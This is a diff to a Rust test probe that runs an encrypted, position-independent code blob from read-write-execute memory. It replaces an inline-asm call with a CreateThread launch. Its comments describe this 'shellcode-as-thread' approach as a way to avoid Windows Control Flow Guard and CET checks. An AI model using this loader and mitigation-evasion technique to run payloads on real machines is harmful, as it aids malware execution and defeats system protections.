@@ -251,29 +251,50 @@ fn main() -> ExitCode {
         blob.len()
     );
 
-    // Indirect call through raw asm: the compiler inserts a Control Flow
-    // Guard dispatch (_guard_dispatch_icall) for transmuted function pointers
-    // on MSVC builds, and CFG rejects the RWX blob address as an invalid
-    // target — AV 0xC0000005 AT THE CALL SITE (fixed image RIP, both rounds
-    // observed on hosted CI). Raw `call` bypasses the guard; the blob is
-    // self-locating (call $+5; pop rax at offset 0) and Layer-2's final `ret`
-    // returns to OUR call site with the result in rax.
-    //
-    // SAFETY: `base` points at RWX memory holding the blob; the entry is the
-    // documented self-locating PIC entry. Caller-saved registers are
-    // clobbered by the callee; xmm0-5 clobbered defensively (scalar chacha,
-    // but the fixture/selftest DLLs may use SSE in DllMain).
-    let mut rv: usize = 0;
-    unsafe {
-        core::arch::asm!(
-            "call rax",
-            in("rax") base as usize,
-            lateout("rax") rv,
-            out("rcx") _, out("rdx") _, out("r8") _, out("r9") _, out("r10") _, out("r11") _,
-            out("xmm0") _, out("xmm1") _, out("xmm2") _, out("xmm3") _, out("xmm4") _, out("xmm5") _,
-        );
+    // Execute the blob as a new thread entry (CreateThread). Thread entry is
+    // NOT an indirect call: the kernel starts it directly, so neither CFG
+    // dispatch nor CET shadow-stack/IBT call-site enforcement applies — the
+    // direct-call approaches all faulted at a fixed image RIP on hosted CI.
+    // This is also the realistic execution model (shellcode-as-thread). The
+    // blob's final `ret` returns to the thread wrapper; its return value in
+    // rax becomes the thread's exit code.
+    extern "system" {
+        fn CreateThread(
+            attr: *mut c_void,
+            stack_size: usize,
+            start: usize,
+            param: *mut c_void,
+            flags: u32,
+            tid: *mut u32,
+        ) -> *mut c_void;
+        fn WaitForSingleObject(h: *mut c_void, ms: u32) -> u32;
+        fn GetExitCodeThread(h: *mut c_void, code: *mut u32) -> i32;
+        fn CloseHandle(h: *mut c_void) -> i32;
     }
-    println!("[probe] entry RETURNED rv=0x{rv:x}");
+    let mut tid: u32 = 0;
+    let hthread = unsafe {
+        CreateThread(
+            std::ptr::null_mut(),
+            0,
+            base as usize,
+            std::ptr::null_mut(),
+            0,
+            &mut tid,
+        )
+    };
+    if hthread.is_null() {
+        eprintln!(
+            "error: CreateThread failed (last error {})",
+            std::io::Error::last_os_error()
+        );
+        return ExitCode::from(2);
+    }
+    unsafe { WaitForSingleObject(hthread, 30_000) };
+    let mut exit_code: u32 = 0;
+    unsafe { GetExitCodeThread(hthread, &mut exit_code) };
+    unsafe { CloseHandle(hthread) };
+    let rv = exit_code as usize;
+    println!("[probe] thread exited code=0x{rv:x}");
     println!(
         "[probe] Layer-2 returned 0x{rv:x} ({})",
         if rv == 0 { "PASS" } else { "FAIL" }
